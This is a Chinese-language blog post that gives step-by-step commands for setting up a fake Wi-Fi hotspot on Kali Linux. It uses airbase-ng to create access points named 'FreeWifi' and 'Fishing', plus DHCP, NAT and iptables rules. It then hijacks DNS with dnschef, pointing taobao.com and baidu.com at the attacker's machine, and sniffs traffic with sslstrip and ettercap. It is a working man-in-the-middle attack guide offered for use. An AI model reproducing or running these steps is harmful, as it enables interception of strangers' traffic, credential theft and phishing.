---
layout: post
title: "Kali + airbase ng + dhcp"
description: ""
category: 
tags: []
---
{% include JB/setup %}

虚拟机里有两个网卡，一个有线，一个无线，因为是dhcp服务，所以无线网卡必须可以作为一个ap来用，有线是为了能够连接互联网时使用的，我个人认为只有一个网卡是没法连接到互联网的 ，因为我尝试了多次无线网卡在监听模式下 ，没法连接网络。再有就是,我原本想利用两个无线网卡来做的，可是我关闭了network-manage服务后，无线网卡的配置就不行了，这个要是有哪个大神懂得的话，也欢迎指教一下。
#####
> ifconfig
<pre>
eth0: 192.168.1.100 /24 gw 192.168.1.2
wlan1: 这个没关系 ，待会会出现另一个称作at0的虚拟网卡，我们需要配置这个网卡。
</pre>

####
> airmon-ng check kill
 
先检查以下会影响网卡监听启动的程序，并将其kill掉。以方便我们后面监听模式的开启。
> airmon-ng start wlan0

开启wlan1 的监听模式,假设网卡开启后的名字叫做wlan0

####
> airbase-ng -e "FreeWifi" -c 6 wlan0

在mon网卡上开启ap功能。注意此时，我们利用无线设备可以搜的到该无线网络，但是我们的dhcp服务还没有搭建完成所以该无线网络并不会连接的上。当我们开启了这个功能后就可以看到前面说的虚拟网卡at0了。
####
配置网卡at0：
> ifconfig at0 192.168.2.1 netmask 255.255.255.0

开启网卡at0：
> ifconfig at0 up

配置路由：
> routers add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1

####配置dhcp服务器：
 在/etc/dhcp/dhcpd.conf 中配置dhcp服务器。我的是如下配置
<pre>
 authritative;#拒绝不正确的IP地址的要求  
 default-lease-time 700;#默认租约
 max-lease-time 8000;#最大默认租约 
 option routers 192.168.2.1;#默认路由 
 domain-name "FreeWiFi";#给予一个域名 
 subnet 192.168.2.0 netmask 255.255.255.0{#关于动态ip分配
 range 192.168.2.101 192.168.2.200;#分配的ip范围
}
</pre>
####
开启ip数据包转发功能：
> echo 1 > /proc/net/ipv4/ip_forward
####开启防火墙中的数据包转发功能
> iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
####开启dhcp服务
>/etc/init.d/isc-dhcp-server start

此时应该就可以实现移动端的连接了，我们可以利用wireshark监听以下这个网卡哦



####建立热点

######工具：isc-dhcp-server  ；Aircrack-ng套件；iptables

######建立过程：

首先写dhcp配置文件/etc/dhcp/dhcpd.conf 

写入如下内容：
<pre>
authoritative;

default-lease-time 700;
max-lease-time 8000;

subnet 10.0.0.0 netmask 255.255.255.0 {
option routers 10.0.0.1;
option subnet-mask 255.255.255.0;

option domain-name-servers 10.0.0.1;

range 10.0.0.10 10.0.0.100;

}
</pre>
这里以10.0.0.1作为网关和dns服务器地址。

然后我们处理无线网卡
<pre>
ifconfig wlan1 down           #wlan1修改成你的网卡
iwconfig wlan1 mode monitor
ifconfig wlan1 up
airmon-ng start wlan1
</pre>
上述命令可以防止出现：Error: Got channel -1, expected a value > 0.

然后用airbase建立热点

airbase-ng -e Fishing -c 11 mon0

热点的网络流量会被虚拟到at0这块网卡上面
<pre>
ifconfig at0 up
ifconfig at0 10.0.0.1 netmask 255.255.255.0
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
</pre>
打开ip转发

> echo 1 > /proc/sys/net/ipv4/ip_forward

开启dhcp

> dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0
> 
> service isc-dhcp-server start

然后可以试着用手机连接，应该可以连上但上不了网

于是配置NAT

> iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE #对eth0进行源nat
> 
> iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT #把无线网卡流量转发到有线网卡（或者什么能上网的网卡）上面
>
> iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356 #修改最大报文段长度

注意那第三个命令调整MSS，不加后果很严重（我就一直死在这里）

（这里可能还是DNS错误，请看后文中的dns代理服务器搭建）

####劫持DNS

#####工具：dnschef

#####过程：

> dnschef -i 10.0.0.1 --nameserver 210.73.64.1#53

上述命令是以ip10.0.0.1（上文中的fakeap网关和DNS的ip）建立dns，对于所有请求转发到210.73.64.1进行解析。显然这只是个“代理”并没有劫持的功效

于是我们进化：

> dnschef --fakedomains=taobao.com,baidu.com --fakeip=192.168.2.1 -i 192.168.2.1 --nameserver 210.73.64.1#53

把淘宝和百度解析到本机了。

####嗅探
虚拟WiFir热点创建成功，接下来就是嗅探：
> sslstrip -fpk 10000 
> 
> ettercap -Tpuqi at0